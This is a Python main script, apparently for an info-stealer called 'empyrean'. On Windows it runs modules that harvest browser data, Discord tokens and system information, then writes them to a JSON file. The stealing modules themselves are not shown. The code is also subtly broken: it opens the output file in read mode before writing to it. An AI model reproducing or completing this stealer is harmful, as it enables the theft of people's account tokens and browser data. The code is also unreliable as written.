import logging
import json
import os
import sys

import click
from rich.logging import RichHandler

from components.browsers import Browsers
from components.discordtoken import DiscordToken
from components.systeminfo import SystemInfo

# Set up logging
logging.basicConfig(
    handlers=[logging.StreamHandler(sys.stdout)],
    level=logging.DEBUG,
    format="%(filename)s:%(lineno)d | %(asctime)s | [%(levelname)s] - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

logger = logging.getLogger()

def main():
    # Assert this is running on a Windows device (if not, exit immediately)
    if os.name != "nt":
        logger.critical("Not a windows machine, can't run")
        exit(1)

    modules = [
        Browsers, # General browser data
        DiscordToken, # Discord-specific data
        SystemInfo, # General system information
    ]

    result = {}

    for module in modules:
        try:
            result[module.MODULE_NAME] = module.run_module()
        except Exception as e:
            print(f'Error in {module.__name__}: {e}')
            
    # Serialize result as result.json
    with open('empyrean-result.json') as fp:
        json.dump(result, fp, indent=2)
                


if __name__ == '__main__':
    main()
